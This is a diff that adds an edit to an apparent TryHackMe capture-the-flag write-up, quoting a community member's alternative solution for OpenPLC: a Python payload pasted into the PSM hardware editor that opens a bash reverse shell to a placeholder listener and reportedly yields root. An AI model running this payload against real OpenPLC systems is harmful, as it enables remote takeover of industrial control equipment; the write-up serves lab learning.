@@ -197,4 +197,57 @@ I found this challenge extremely interesting because I really like to experiment
 
 
 
+---
+
+### EDIT: 
+
+> After sharing this writeup on the fantastic TryHackMe Discord group, a friendly user named **Korizma** shared another possible solution, which we decided to include here for completeness, by exploiting the "Python Linux Hardware Subsystem".
+
+**Here is Korizma’s full message:**
+
+You can also get a reverse shell from KABOOM PT.2 using the Python Linux Hardware Subsystem. : the Hardware tab in the web dashboard, which featured a dropdown menu for "Python on Linux (PSM)". This powerful subsystem is designed to allow administrators to write custom drivers but effectively creates a feature-based RCE, allowing arbitrary Python code to be executed by the OpenPLC runtime.
+
+  Exploit Development & Execution
+  Initial payloads placed in the hardware_init() function failed, likely because the PLC's network stack was not fully initialized.
+
+  The successful exploit was triggered from within the update_inputs() function, which is called on every PLC cycle. This ensured the system was in a stable state before execution. To prevent the main PLC loop from crashing, the final payload launches the reverse shell in a separate, non-blocking thread.
+
+  Final PSM Exploit Payload
+  This code was pasted into the PSM editor, saved, and triggered by restarting the PLC. 
+
+  ```python
+
+  # Final, Concrete PSM Exploit Payload
+  import os
+  import threading
+
+  # A flag to ensure the exploit only runs once.
+  exploit_attempted = False
+  counter = 0
+
+  def hardware_init():
+      # Left empty to ensure PLC stability on boot.
+      pass
+
+  def update_inputs():
+      # This function is called on every PLC cycle.
+      global counter, exploit_attempted
+      counter += 1
+      
+      # Execute exploit after 5 cycles to ensure PLC is stable.
+      if counter == 5 and not exploit_attempted:
+          exploit_attempted = True
+          exploit_thread = threading.Thread(target=run_exploit, daemon=True)
+          exploit_thread.start()
+
+  def run_exploit():
+      # This function contains the single, most reliable reverse shell payload.
+      os.system("bash -c 'bash -i >& /dev/tcp/YOUR_LISTENER_IP/4444 0>&1'")
+
+  def update_outputs():
+      pass
+
+```
+  Pasting this code and restarting the PLC resulted in a root shell. GGs! 👑
+
 
